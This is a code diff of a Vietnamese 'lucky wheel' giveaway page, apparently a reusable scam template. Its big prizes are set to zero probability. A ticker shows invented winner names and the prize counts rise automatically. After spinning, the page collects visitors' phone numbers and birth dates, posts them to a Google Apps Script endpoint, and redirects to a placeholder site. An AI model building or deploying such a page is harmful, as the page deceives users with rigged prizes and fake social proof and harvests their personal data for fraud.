+    <div class="p-icon">⛔</div>
+    <div class="p-title">Bạn đã tham gia rồi!</div>
+    <div class="p-msg">Mỗi thiết bị chỉ được quay <strong>1 lần duy nhất</strong>.</div>
+    <div class="p-prize-box" id="playedPrizeBox" style="display:none">
+      <div class="p-prize-lbl">Giải thưởng đã nhận:</div>
+      <div class="p-prize-val" id="playedPrizeVal"></div>
+    </div>
+    <button class="p-visit-btn" onclick="goToSite()">🎯 Truy cập ngay →</button>
   </div>
 </div>
 
 <script>
-// ===================== DATA =====================
-const prizes = [
-  { name: "May mắn lần sau",   icon: "🍀", color: "#e74c3c", prob: 5,  baseCount: 3842, value: 0      },
-  { name: "Xe máy SH 150i",    icon: "🛵", color: "#fff",    prob: 0,  baseCount: 2,    value: 0      },
-  { name: "iPhone 16 Pro Max", icon: "📱", color: "#e74c3c", prob: 0,  baseCount: 5,    value: 0      },
-  { name: "Xe máy Vision 2026",icon: "🏍️",color: "#fff",    prob: 0,  baseCount: 3,    value: 0      },
-  { name: "Thưởng 500K",       icon: "💰", color: "#e74c3c", prob: 0,  baseCount: 18,   value: 500000 },
-  { name: "Thưởng 200K",       icon: "💵", color: "#fff",    prob: 0,  baseCount: 47,   value: 200000 },
-  { name: "Thưởng 100K",       icon: "💴", color: "#e74c3c", prob: 0,  baseCount: 124,  value: 100000 },
-  { name: "Quà tặng đặc biệt", icon: "🎁", color: "#fff",    prob: 20, baseCount: 1563, value: 0      },
-  { name: "May mắn lần sau",   icon: "🍀", color: "#e74c3c", prob: 5,  baseCount: 3791, value: 0      },
-  { name: "Thưởng 350K",       icon: "💎", color: "#fff",    prob: 0,  baseCount: 29,   value: 350000 },
-  { name: "Điểm thưởng 150K",  icon: "⭐", color: "#e74c3c", prob: 0,  baseCount: 83,   value: 150000 },
-  { name: "Thưởng 50K",        icon: "🧧", color: "#fff",    prob: 70, baseCount: 5287, value: 50000  },
+// ============================================================
+//  ĐỔI 2 DÒNG NÀY
+// ============================================================
+const REDIRECT_URL  = 'https://YOUR-WEBSITE.COM';
+const APPS_SCRIPT_URL = 'https://script.google.com/macros/s/https://script.google.com/macros/s/AKfycbwWWr5sQEBZqwgcrFo9WqQR4D3uMXxeqpwYyWtozQcPIrkKnr7fc3sYeZa_4dnYtJGh/exec/exec/exec';
+// ============================================================
+const STORAGE_KEY = 'vqmm_v3_2026';
+
+const prizes=[
+  {name:"May mắn lần sau",  icon:"🍀",color:"#e74c3c",prob:15, base:3842,value:0},
+  {name:"Xe máy SH 150i",   icon:"🛵",color:"#f8f8f8",prob:0, base:2,   value:0},
+  {name:"iPhone 16 Pro Max",icon:"📱",color:"#e74c3c",prob:0, base:5,   value:0},
+  {name:"Xe máy Vision 2026",icon:"🏍️",color:"#f8f8f8",prob:0,base:3,  value:0},
+  {name:"Thưởng 500K",      icon:"💰",color:"#e74c3c",prob:0, base:18,  value:500000},
+  {name:"Thưởng 200K",      icon:"💵",color:"#f8f8f8",prob:0, base:47,  value:200000},
+  {name:"Thưởng 100K",      icon:"💴",color:"#e74c3c",prob:0, base:124, value:100000},
+  {name:"Quà tặng đặc biệt",icon:"🎁",color:"#f8f8f8",prob:50,base:1563,value:0},
+  {name:"May mắn lần sau",  icon:"🍀",color:"#e74c3c",prob:15, base:3791,value:0},
+  {name:"Thưởng 350K",      icon:"💎",color:"#f8f8f8",prob:0, base:29,  value:350000},
+  {name:"Điểm thưởng 150K", icon:"⭐",color:"#e74c3c",prob:0, base:83,  value:150000},
+  {name:"Thưởng 50K",       icon:"🧧",color:"#f8f8f8",prob:25,base:5287,value:50000},
 ];
+const fakeNames=["Nguyễn V.A","Trần T.B","Lê M.C","Phạm T.D","Hoàng V.E","Đặng T.F","Vũ M.G","Bùi T.H","Đỗ V.I","Ngô T.K","Dương V.L","Lý T.M","Phan V.N","Võ T.O","Đinh M.P"];
+const pool=[];prizes.forEach((p,i)=>{for(let j=0;j<p.prob;j++)pool.push(i);});
+const liveCounts=prizes.map(p=>p.base);
+let chances=3,spinning=false,currentAngle=0,myPrizes=[],totalValue=0;
 
-const fakeNames = ["Nguyễn V.A","Trần T.B","Lê M.C","Phạm T.D","Hoàng V.E","Đặng T.F","Vũ M.G","Bùi T.H","Đỗ V.I","Ngô T.K","Dương V.L","Lý T.M","Phan V.N","Võ T.O","Đinh M.P"];
-
-const pool = [];
-prizes.forEach((p,i) => { for(let j=0;j<p.prob;j++) pool.push(i); });
-const liveCounts = prizes.map(p=>p.baseCount);
-
-let chances = 3, spinning = false, currentAngle = 0;
-let spinCount = 0;
-let myPrizes = [];
-let totalValue = 0;
-
-// ===================== BUILD TABLE =====================
-function buildTable() {
-  const tbody = document.getElementById('prizeTable');
-  tbody.innerHTML = '';
-  prizes.forEach((p,i) => {
-    const tr = document.createElement('tr');
-    tr.innerHTML = `<td>${p.icon} ${p.name}</td><td><span class="count-badge" id="cnt-${i}">${liveCounts[i].toLocaleString('vi-VN')} người</span></td>`;
-    tbody.appendChild(tr);
-  });
-}
-buildTable();
-
-// ===================== SOUND ENGINE (Web Audio API) =====================
-const AC = new (window.AudioContext || window.webkitAudioContext)();
-
-function playTick() {
-  const o = AC.createOscillator(), g = AC.createGain();
-  o.connect(g); g.connect(AC.destination);
-  o.frequency.value = 800 + Math.random()*400;
-  o.type = 'sine';
-  g.gain.setValueAtTime(0.15, AC.currentTime);
-  g.gain.exponentialRampToValueAtTime(0.001, AC.currentTime + 0.05);
-  o.start(); o.stop(AC.currentTime + 0.05);
-}
-
-function playWin() {
-  [523,659,784,1047].forEach((f,i) => {
-    const o = AC.createOscillator(), g = AC.createGain();
-    o.connect(g); g.connect(AC.destination);
-    o.frequency.value = f; o.type = 'triangle';
-    const t = AC.currentTime + i*0.15;
-    g.gain.setValueAtTime(0, t);
-    g.gain.linearRampToValueAtTime(0.3, t+0.05);
-    g.gain.exponentialRampToValueAtTime(0.001, t+0.4);
-    o.start(t); o.stop(t+0.4);
-  });
-}
-
-function playStart() {
-  const o = AC.createOscillator(), g = AC.createGain();
-  o.connect(g); g.connect(AC.destination);
-  o.type = 'sawtooth';
-  o.frequency.setValueAtTime(200, AC.currentTime);
-  o.frequency.linearRampToValueAtTime(400, AC.currentTime+0.3);
-  g.gain.setValueAtTime(0.2, AC.currentTime);
-  g.gain.exponentialRampToValueAtTime(0.001, AC.currentTime+0.3);
-  o.start(); o.stop(AC.currentTime+0.3);
-}
-
-// ===================== WHEEL CANVAS =====================
-const canvas = document.getElementById('wheel');
-const ctx = canvas.getContext('2d');
-const W=canvas.width, H=canvas.height, cx=W/2, cy=H/2, r=W/2-10;
-const numSlices=prizes.length, sliceAngle=(2*Math.PI)/numSlices;
-
-let lightPhase = 0;
-function drawWheel(angle, isSpinning) {
-  ctx.clearRect(0,0,W,H);
-  lightPhase += isSpinning ? 0.18 : 0.04;
-
-  // Glow ring behind wheel
-  const grd = ctx.createRadialGradient(cx,cy,r-20,cx,cy,r+30);
-  const gAlpha = 0.3 + 0.2*Math.sin(lightPhase);
-  grd.addColorStop(0,'rgba(255,215,0,0)');
-  grd.addColorStop(0.7,`rgba(255,165,0,${gAlpha})`);
-  grd.addColorStop(1,'rgba(255,50,0,0)');
-  ctx.beginPath(); ctx.arc(cx,cy,r+30,0,2*Math.PI);
-  ctx.fillStyle=grd; ctx.fill();
-
-  // Slices
-  for(let i=0;i<numSlices;i++){
-    const start=angle+i*sliceAngle, end=start+sliceAngle;
-    ctx.beginPath(); ctx.moveTo(cx,cy);
-    ctx.arc(cx,cy,r,start,end); ctx.closePath();
-    ctx.fillStyle=prizes[i].color; ctx.fill();
-    ctx.strokeStyle='#C0392B'; ctx.lineWidth=2; ctx.stroke();
-
-    ctx.save();
-    ctx.translate(cx,cy);
-    ctx.rotate(start+sliceAngle/2);
-    const textR=r*0.60;
-    ctx.fillStyle=prizes[i].color==='#fff'?'#8B0000':'#fff';
-    ctx.textAlign='center'; ctx.textBaseline='middle';
-    ctx.font='bold 14px Arial';
-    ctx.fillText(prizes[i].icon, textR, 0);
-    ctx.save();
-    ctx.translate(textR-18,0); ctx.rotate(Math.PI/2);
-    ctx.font='bold 8px Arial';
-    prizes[i].name.split(' ').slice(0,4).forEach((w,wi,arr)=>{
-      ctx.fillText(w, 0, wi*10-(arr.length-1)*5);
-    });
-    ctx.restore();
-    ctx.restore();
+// Particles
+(function(){
+  const pc=document.getElementById('particles');
+  const colors=['rgba(255,215,0,.5)','rgba(255,100,0,.4)','rgba(255,255,255,.3)'];
+  for(let i=0;i<18;i++){
+    const d=document.createElement('div'),s=4+Math.random()*8;
+    d.className='particle';
+    d.style.cssText=`width:${s}px;height:${s}px;left:${Math.random()*100}%;bottom:${Math.random()*20}%;background:${colors[i%3]};animation-duration:${6+Math.random()*8}s;animation-delay:${Math.random()*6}s;`;
+    pc.appendChild(d);
   }
+})();
 
-  // Dividers
-  for(let i=0;i<numSlices;i++){
-    ctx.beginPath(); ctx.moveTo(cx,cy);
-    const la=angle+i*sliceAngle;
-    ctx.lineTo(cx+r*Math.cos(la),cy+r*Math.sin(la));
-    ctx.strokeStyle='#C0392B'; ctx.lineWidth=2; ctx.stroke();
-  }
+// Prize rows
+(function(){
+  const wrap=document.getElementById('prizeRows');
+  prizes.forEach((p,i)=>{
+    const div=document.createElement('div');div.className='prize-row';
+    div.innerHTML=`<span class="prize-name-cell"><span>${p.icon}</span>${p.name}</span><span class="prize-count" id="cnt-${i}">${liveCounts[i].toLocaleString('vi-VN')} người</span>`;
+    wrap.appendChild(div);
+  });
+})();
 
-  // Outer ring
-  ctx.beginPath(); ctx.arc(cx,cy,r,0,2*Math.PI);
-  ctx.strokeStyle='#8B0000'; ctx.lineWidth=10; ctx.stroke();
+// Fill DOB
+(function(){
+  const dd=document.getElementById('dobDay'),dm=document.getElementById('dobMonth'),dy=document.getElementById('dobYear');
+  for(let d=1;d<=31;d++)dd.add(new Option(d,d));
+  for(let m=1;m<=12;m++)dm.add(new Option('Tháng '+m,m));
+  const y=new Date().getFullYear();
+  for(let yr=y-80;yr<=y;yr++)dy.add(new Option(yr,yr));
+})();
 
-  // Animated light dots on rim
-  const dotCount=32;
-  for(let i=0;i<dotCount;i++){
-    const a=(2*Math.PI/dotCount)*i+angle;
-    const lit=(Math.sin(lightPhase*2+i*0.8)>0);
-    ctx.beginPath();
-    ctx.arc(cx+(r-5)*Math.cos(a), cy+(r-5)*Math.sin(a), 6, 0, 2*Math.PI);
-    if(lit){
-      ctx.fillStyle='#FFD700';
-      ctx.shadowColor='#FFD700';
-      ctx.shadowBlur=isSpinning?16:8;
-    } else {
-      ctx.fillStyle='#fff';
-      ctx.shadowColor='transparent';
-      ctx.shadowBlur=0;
+// Check played
+function checkPlayed(){
+  const raw=localStorage.getItem(STORAGE_KEY);
+  if(!raw)return;
+  try{
+    const s=JSON.parse(raw);
+    document.getElementById('playedOverlay').classList.add('show');
+    if(s.prizes&&s.prizes.length){
+      document.getElementById('playedPrizeBox').style.display='block';
+      document.getElementById('playedPrizeVal').textContent=s.prizes.map(p=>p.icon+' '+p.name).join(' | ')+(s.total>0?' → '+s.total.toLocaleString('vi-VN')+' ₫':'');
     }
-    ctx.fill();
-    ctx.shadowBlur=0;
-  }
+  }catch(e){}
+}
+function savePlayed(){localStorage.setItem(STORAGE_KEY,JSON.stringify({ts:Date.now(),prizes:myPrizes.map(p=>({name:p.name,icon:p.icon})),total:totalValue}));}
+function goToSite(){window.location.href=REDIRECT_URL;}
 
-  // Center button bg
-  const cgrd=ctx.createRadialGradient(cx-8,cy-8,4,cx,cy,48);
-  cgrd.addColorStop(0,'#FFE066'); cgrd.addColorStop(1,'#FF8C00');
-  ctx.beginPath(); ctx.arc(cx,cy,48,0,2*Math.PI);
-  ctx.fillStyle=cgrd; ctx.fill();
-  ctx.strokeStyle='#fff'; ctx.lineWidth=4; ctx.stroke();
-  if(isSpinning){
-    ctx.shadowColor='#FFD700'; ctx.shadowBlur=20;
-    ctx.beginPath(); ctx.arc(cx,cy,48,0,2*Math.PI);
-    ctx.strokeStyle='rgba(255,215,0,0.8)'; ctx.lineWidth=3; ctx.stroke();
-    ctx.shadowBlur=0;
+// =================== GỬI DATA LÊN GOOGLE SHEET ===================
+async function sendToGoogleSheet(payload){
+  try{
+    await fetch(APPS_SCRIPT_URL,{
+      method:'POST',
+      mode:'no-cors', // bắt buộc với Apps Script
+      headers:{'Content-Type':'application/json'},
+      body:JSON.stringify(payload)
+    });
+    return true;
+  }catch(e){
+    console.warn('Sheet gửi lỗi:',e);
+    return false; // vẫn cho redirect dù lỗi
   }
 }
-drawWheel(0, false);
 
-// ===================== SPIN LOGIC =====================
-let lastTickAngle = 0;
-function pickWinner(){
-  if(pool.length===0) return Math.floor(Math.random()*numSlices);
-  return pool[Math.floor(Math.random()*pool.length)];
+// Verify button
+function checkReady(){
+  const ph=document.getElementById('phoneInput').value.trim();
+  const d=document.getElementById('dobDay').value;
+  const m=document.getElementById('dobMonth').value;
+  const y=document.getElementById('dobYear').value;
+  const chk=document.getElementById('agreeChk').checked;
+  const ok=!!(ph.length>=9&&d&&m&&y&&chk);
+  const btn=document.getElementById('vConfirmBtn');
+  btn.style.opacity=ok?'1':'0.5';
+  btn.style.cursor=ok?'pointer':'not-allowed';
+  btn._ready=ok;
+}
+['dobDay','dobMonth','dobYear','agreeChk'].forEach(id=>document.getElementById(id).addEventListener('change',checkReady));
+document.getElementById('phoneInput').addEventListener('input',checkReady);
+document.getElementById('vConfirmBtn').addEventListener('click',function(){
+  if(this._ready)confirmAge();
+  else document.getElementById('vError').textContent='⚠️ Vui lòng điền đầy đủ thông tin.';
+});
+checkReady();
+
+async function confirmAge(){
+  const ph=document.getElementById('phoneInput').value.trim();
+  const d=parseInt(document.getElementById('dobDay').value);
+  const m=parseInt(document.getElementById('dobMonth').value);
+  const y=parseInt(document.getElementById('dobYear').value);
+  const err=document.getElementById('vError');
+
+  if(!ph||ph.length<9){err.textContent='⚠️ Số điện thoại không hợp lệ (ít nhất 9 số).';return;}
+  if(!d||!m||!y){err.textContent='⚠️ Vui lòng chọn đầy đủ ngày sinh.';return;}
+
+  const dob=new Date(y,m-1,d);
+  let age=new Date().getFullYear()-dob.getFullYear();
+  const now=new Date();
+  if(now.getMonth()<dob.getMonth()||(now.getMonth()===dob.getMonth()&&now.getDate()<dob.getDate()))age--;
+  if(age<18){err.textContent='🚫 Bạn chưa đủ 18 tuổi để nhận thưởng.';return;}
+
+  err.textContent='';
+  const btn=document.getElementById('vConfirmBtn');
+  btn.textContent='⏳ Đang gửi thông tin...';
+  btn.classList.add('sending');
+  btn._ready=false;
+
+  // Chuẩn bị dữ liệu gửi lên Sheet
+  const payload={
+    phone   : '+84' + ph.replace(/^0/,''),
+    dob     : `${String(d).padStart(2,'0')}/${String(m).padStart(2,'0')}/${y}`,
+    age     : age,
+    prize1  : myPrizes[0]?myPrizes[0].icon+' '+myPrizes[0].name:'',
+    prize2  : myPrizes[1]?myPrizes[1].icon+' '+myPrizes[1].name:'',
+    prize3  : myPrizes[2]?myPrizes[2].icon+' '+myPrizes[2].name:'',
+    totalValue: totalValue,
+    device  : navigator.userAgent.includes('Mobile')?'Mobile':'Desktop'
+  };
+
+  await sendToGoogleSheet(payload);
+
+  // Show success
+  document.getElementById('sendSuccess').classList.add('show');
+  btn.style.display='none';
+  savePlayed();
+
+  setTimeout(()=>{
+    document.getElementById('verifyOverlay').classList.remove('show');
+    window.location.href=REDIRECT_URL;
+  },1800);
 }
 
+function showVerify(){
+  for(let i=0;i<3;i++){
+    const el=document.getElementById('vr'+(i+1));
+    el.textContent=myPrizes[i]?myPrizes[i].icon+' '+myPrizes[i].name:'';
+  }
+  document.getElementById('vTotal').textContent='Tổng: '+(totalValue>0?totalValue.toLocaleString('vi-VN')+' ₫':'🎁 Phần quà');
+  document.getElementById('verifyOverlay').classList.add('show');
+}
+
+// Sound
+let AC;
+function getAC(){if(!AC)AC=new(window.AudioContext||window.webkitAudioContext)();if(AC.state==='suspended')AC.resume();return AC;}
+function playTick(){try{const ac=getAC(),o=ac.createOscillator(),g=ac.createGain();o.connect(g);g.connect(ac.destination);o.frequency.value=600+Math.random()*500;o.type='sine';g.gain.setValueAtTime(.12,ac.currentTime);g.gain.exponentialRampToValueAtTime(.001,ac.currentTime+.05);o.start();o.stop(ac.currentTime+.05);}catch(e){}}
+function playWin(){try{const ac=getAC();[523,659,784,1047].forEach((f,i)=>{const o=ac.createOscillator(),g=ac.createGain();o.connect(g);g.connect(ac.destination);o.frequency.value=f;o.type='triangle';const t=ac.currentTime+i*.15;g.gain.setValueAtTime(0,t);g.gain.linearRampToValueAtTime(.3,t+.05);g.gain.exponentialRampToValueAtTime(.001,t+.4);o.start(t);o.stop(t+.4);});}catch(e){}}
+function playStart(){try{const ac=getAC(),o=ac.createOscillator(),g=ac.createGain();o.connect(g);g.connect(ac.destination);o.type='sawtooth';o.frequency.setValueAtTime(200,ac.currentTime);o.frequency.linearRampToValueAtTime(400,ac.currentTime+.25);g.gain.setValueAtTime(.15,ac.currentTime);g.gain.exponentialRampToValueAtTime(.001,ac.currentTime+.25);o.start();o.stop(ac.currentTime+.25);}catch(e){}}
+
+// Canvas
+const canvas=document.getElementById('wheel'),ctx=canvas.getContext('2d');
+function resizeCanvas(){const wo=document.getElementById('wheelOuter'),s=wo.offsetWidth;canvas.width=s;canvas.height=s;}
+resizeCanvas();window.addEventListener('resize',()=>{resizeCanvas();drawWheel(currentAngle,false);});
+let lightPhase=0,lastTick=0;
+
+function drawWheel(angle,isSpinning){
+  const S=canvas.width,cx=S/2,cy=S/2,r=S/2-4,ns=prizes.length,sa=(2*Math.PI)/ns;
+  ctx.clearRect(0,0,S,S);lightPhase+=isSpinning?.2:.04;
+  const grd=ctx.createRadialGradient(cx,cy,r-10,cx,cy,r+20);
+  const ga=.25+.2*Math.sin(lightPhase);
+  grd.addColorStop(0,'rgba(255,200,0,0)');grd.addColorStop(.8,`rgba(255,150,0,${ga})`);grd.addColorStop(1,'rgba(255,50,0,0)');
+  ctx.beginPath();ctx.arc(cx,cy,r+20,0,2*Math.PI);ctx.fillStyle=grd;ctx.fill();
+  for(let i=0;i<ns;i++){
+    const st=angle+i*sa,en=st+sa;
+    ctx.beginPath();ctx.moveTo(cx,cy);ctx.arc(cx,cy,r,st,en);ctx.closePath();
+    ctx.fillStyle=prizes[i].color;ctx.fill();ctx.strokeStyle='#B71C1C';ctx.lineWidth=1.5;ctx.stroke();
+    ctx.save();ctx.translate(cx,cy);ctx.rotate(st+sa/2);
+    const tr=r*.6;ctx.fillStyle=prizes[i].color==='#f8f8f8'?'#8B0000':'#fff';
+    ctx.textAlign='center';ctx.textBaseline='middle';ctx.font=`bold ${Math.max(11,S*.038)}px Arial`;ctx.fillText(prizes[i].icon,tr,0);
+    ctx.save();ctx.translate(tr-16,0);ctx.rotate(Math.PI/2);ctx.font=`bold ${Math.max(7,S*.022)}px Arial`;
+    prizes[i].name.split(' ').slice(0,4).forEach((w,wi,a)=>ctx.fillText(w,0,wi*9-(a.length-1)*4.5));
+    ctx.restore();ctx.restore();
+  }
+  for(let i=0;i<ns;i++){ctx.beginPath();ctx.moveTo(cx,cy);const la=angle+i*sa;ctx.lineTo(cx+r*Math.cos(la),cy+r*Math.sin(la));ctx.strokeStyle='#B71C1C';ctx.lineWidth=1.5;ctx.stroke();}
+  ctx.beginPath();ctx.arc(cx,cy,r,0,2*Math.PI);ctx.strokeStyle='#7B0000';ctx.lineWidth=8;ctx.stroke();
+  for(let i=0;i<36;i++){
+    const a=(2*Math.PI/36)*i+angle,lit=Math.sin(lightPhase*2.5+i*.7)>0;
+    ctx.beginPath();ctx.arc(cx+(r-4)*Math.cos(a),cy+(r-4)*Math.sin(a),S*.014,0,2*Math.PI);
+    ctx.fillStyle=lit?'#FFD700':'rgba(255,255,255,.6)';
+    if(lit){ctx.shadowColor='#FFD700';ctx.shadowBlur=isSpinning?14:7;}else ctx.shadowBlur=0;
+    ctx.fill();ctx.shadowBlur=0;
+  }
+  const cg=ctx.createRadialGradient(cx-S*.04,cy-S*.04,S*.01,cx,cy,S*.115);
+  cg.addColorStop(0,'#FFE566');cg.addColorStop(1,'#FF7700');
+  ctx.beginPath();ctx.arc(cx,cy,S*.115,0,2*Math.PI);ctx.fillStyle=cg;ctx.fill();
+  ctx.strokeStyle='rgba(255,255,255,.8)';ctx.lineWidth=3;ctx.stroke();
+}
+drawWheel(0,false);
+
+function pickWinner(){return pool.length?pool[Math.floor(Math.random()*pool.length)]:Math.floor(Math.random()*prizes.length);}
 function spin(){
-  if(spinning) return;
-  if(chances<=0){ document.getElementById('noSpinMsg').style.display='block'; return; }
-  if(AC.state==='suspended') AC.resume();
-  playStart();
-
-  spinning=true; chances--;
+  if(spinning)return;
+  if(chances<=0){document.getElementById('noSpinMsg').style.display='block';return;}
+  playStart();spinning=true;chances--;
   document.getElementById('chances').textContent=chances;
   document.getElementById('spinBtn').disabled=true;
-
-  const winnerIdx=pickWinner();
-  const extra=6+Math.floor(Math.random()*4);
-  const sliceMid=winnerIdx*sliceAngle+sliceAngle/2;
-  const targetWheelAngle=(-Math.PI/2-sliceMid-extra*2*Math.PI);
-  const nc=((currentAngle%(2*Math.PI))+2*Math.PI)%(2*Math.PI);
-  const nt=((targetWheelAngle%(2*Math.PI))+2*Math.PI)%(2*Math.PI);
-  let delta=nt-nc; if(delta>0) delta-=2*Math.PI;
-  const totalRotation=delta-extra*2*Math.PI;
-  const startAngle=currentAngle;
-  const duration=4500+Math.random()*1500;
-  const startTime=performance.now();
-  lastTickAngle=currentAngle;
-
-  function easeOut(t){ return 1-Math.pow(1-t,4); }
+  const ns=prizes.length,sa=(2*Math.PI)/ns,wi=pickWinner();
+  const extra=6+Math.floor(Math.random()*4),sm=wi*sa+sa/2,twa=(-Math.PI/2-sm-extra*2*Math.PI);
+  const nc=((currentAngle%(2*Math.PI))+2*Math.PI)%(2*Math.PI),nt=((twa%(2*Math.PI))+2*Math.PI)%(2*Math.PI);
+  let delta=nt-nc;if(delta>0)delta-=2*Math.PI;
+  const totalRot=delta-extra*2*Math.PI,startA=currentAngle,dur=4500+Math.random()*1500,t0=performance.now();
+  lastTick=currentAngle;
+  function ease(t){return 1-Math.pow(1-t,4);}
   function animate(now){
-    const elapsed=now-startTime;
-    const progress=Math.min(elapsed/duration,1);
-    currentAngle=startAngle+totalRotation*easeOut(progress);
-    drawWheel(currentAngle, true);
-
-    // Tick sound based on slice crossing
-    const slicesCrossed=Math.floor(Math.abs(currentAngle-lastTickAngle)/sliceAngle);
-    if(slicesCrossed>0){ playTick(); lastTickAngle=currentAngle; }
-
-    if(progress<1){ requestAnimationFrame(animate); return; }
-
-    spinning=false;
-    drawWheel(currentAngle, false);
+    const el=now-t0,pr=Math.min(el/dur,1);
+    currentAngle=startA+totalRot*ease(pr);drawWheel(currentAngle,true);
+    const sc=Math.floor(Math.abs(currentAngle-lastTick)/sa);if(sc>0){playTick();lastTick=currentAngle;}
+    if(pr<1){requestAnimationFrame(animate);return;}
+    spinning=false;drawWheel(currentAngle,false);
     document.getElementById('spinBtn').disabled=false;
-    playWin();
-    spawnConfetti();
-
-    // Update count
-    liveCounts[winnerIdx]++;
-    const badge=document.getElementById('cnt-'+winnerIdx);
-    if(badge){
-      badge.textContent=liveCounts[winnerIdx].toLocaleString('vi-VN')+' người';
-      badge.classList.add('bump');
-      setTimeout(()=>badge.classList.remove('bump'),500);
-    }
-
-    // Update my prizes
-    spinCount++;
-    myPrizes.push(prizes[winnerIdx]);
-    totalValue+=prizes[winnerIdx].value;
-    updateMyPrizes();
-
+    playWin();spawnConfetti();
+    liveCounts[wi]++;const b=document.getElementById('cnt-'+wi);
+    if(b){b.textContent=liveCounts[wi].toLocaleString('vi-VN')+' người';b.classList.add('bump');setTimeout(()=>b.classList.remove('bump'),400);}
+    myPrizes.push(prizes[wi]);totalValue+=prizes[wi].value;updateMyPrizes();
     setTimeout(()=>{
-      document.getElementById('prizeIcon').textContent=prizes[winnerIdx].icon;
-      document.getElementById('prizeName').textContent=prizes[winnerIdx].name;
-      const left=chances;
-      document.getElementById('spinLeftMsg').textContent=
-        left>0 ? `Bạn còn ${left} lượt quay!` : '🎊 Bạn đã dùng hết lượt!';
-      document.getElementById('resultPopup').classList.add('show');
-      if(chances===0) document.getElementById('noSpinMsg').style.display='block';
+      document.getElementById('rIcon').textContent=prizes[wi].icon;
+      document.getElementById('rName').textContent=prizes[wi].name;
+      document.getElementById('rLeft').textContent=chances>0?`Còn ${chances} lượt nữa!`:'🎊 Hết lượt — Xác minh để nhận thưởng!';
+      document.getElementById('resultOverlay').classList.add('show');
+      if(chances===0)document.getElementById('noSpinMsg').style.display='block';
     },300);
   }
   requestAnimationFrame(animate);
 }
-
-// ===================== MY PRIZES =====================
 function updateMyPrizes(){
-  for(let i=0;i<3;i++){
-    const el=document.getElementById('r'+(i+1));
-    if(myPrizes[i]){
-      el.textContent=myPrizes[i].icon+' '+myPrizes[i].name;
-    }
-  }
-  const fmt=totalValue.toLocaleString('vi-VN');
-  document.getElementById('totalVal').textContent=
-    totalValue>0 ? fmt+' ₫' : '🎁 Phần quà';
+  for(let i=0;i<3;i++){const el=document.getElementById('r'+(i+1));if(myPrizes[i])el.textContent=myPrizes[i].icon+' '+myPrizes[i].name;}
+  document.getElementById('totalVal').textContent=totalValue>0?totalValue.toLocaleString('vi-VN')+' ₫':'🎁 Quà';
 }
-
-// ===================== CONFETTI =====================
+function closeResult(){
+  document.getElementById('resultOverlay').classList.remove('show');
+  if(chances===0)setTimeout(showVerify,500);
+}
 function spawnConfetti(){
-  const colors=['#FFD700','#FF6B6B','#4ECDC4','#45B7D1','#96CEB4','#FFEAA7','#DDA0DD'];
-  for(let i=0;i<40;i++){
-    const div=document.createElement('div');
-    div.className='confetti-piece';
-    div.style.left=Math.random()*100+'vw';
-    div.style.top=Math.random()*30+'vh';
-    div.style.background=colors[Math.floor(Math.random()*colors.length)];
-    div.style.animationDelay=Math.random()*0.5+'s';
-    div.style.animationDuration=(0.8+Math.random()*0.8)+'s';
-    div.style.transform=`rotate(${Math.random()*360}deg)`;
-    div.style.width=div.style.height=(6+Math.random()*8)+'px';
-    document.body.appendChild(div);
-    setTimeout(()=>div.remove(),1500);
-  }
+  const colors=['#FFD700','#FF6B6B','#4ECDC4','#96CEB4','#DDA0DD','#FFEAA7'];
+  for(let i=0;i<50;i++){const d=document.createElement('div');d.className='cf';d.style.cssText=`left:${Math.random()*100}vw;top:${10+Math.random()*30}vh;background:${colors[i%colors.length]};animation-delay:${Math.random()*.5}s;animation-duration:${.9+Math.random()*.7}s;width:${6+Math.random()*7}px;height:${6+Math.random()*7}px;`;document.body.appendChild(d);setTimeout(()=>d.remove(),1600);}
 }
-
-function closeResult(){ document.getElementById('resultPopup').classList.remove('show'); }
-
-// ===================== AUTO INCREMENT =====================
-function autoIncrement(){
-  const updatePool=[];
-  prizes.forEach((p,i)=>{ const w=p.prob>0?p.prob:1; for(let j=0;j<w;j++) updatePool.push(i); });
-  const idx=updatePool[Math.floor(Math.random()*updatePool.length)];
-  const add=Math.floor(Math.random()*3)+1;
-  liveCounts[idx]+=add;
-  const badge=document.getElementById('cnt-'+idx);
-  if(badge){
-    badge.textContent=liveCounts[idx].toLocaleString('vi-VN')+' người';
-    badge.classList.add('bump');
-    setTimeout(()=>badge.classList.remove('bump'),400);
-  }
-  const name=fakeNames[Math.floor(Math.random()*fakeNames.length)];
-  const ticker=document.getElementById('liveTicker');
-  ticker.innerHTML=`🔴 <span>${name}</span> vừa nhận <span>${prizes[idx].icon} ${prizes[idx].name}</span>`;
-  setTimeout(autoIncrement, 2500+Math.random()*4000);
+function autoInc(){
+  const up=[];prizes.forEach((p,i)=>{const w=p.prob>0?p.prob:1;for(let j=0;j<w;j++)up.push(i);});
+  const idx=up[Math.floor(Math.random()*up.length)];liveCounts[idx]+=Math.floor(Math.random()*3)+1;
+  const b=document.getElementById('cnt-'+idx);if(b){b.textContent=liveCounts[idx].toLocaleString('vi-VN')+' người';b.classList.add('bump');setTimeout(()=>b.classList.remove('bump'),400);}
+  const nm=fakeNames[Math.floor(Math.random()*fakeNames.length)];
+  document.getElementById('liveTicker').innerHTML=`🔴 <b>${nm}</b> vừa nhận <b>${prizes[idx].icon} ${prizes[idx].name}</b>`;
+  setTimeout(autoInc,2500+Math.random()*4000);
 }
-setTimeout(autoIncrement, 2000);
-
-// Animate wheel glow loop even when idle
-function idleLoop(){
-  if(!spinning) drawWheel(currentAngle, false);
-  requestAnimationFrame(idleLoop);
-}
+setTimeout(autoInc,2000);
+function idleLoop(){if(!spinning)drawWheel(currentAngle,false);requestAnimationFrame(idleLoop);}
 idleLoop();
+checkPlayed();
 </script>
 </body>
 </html>
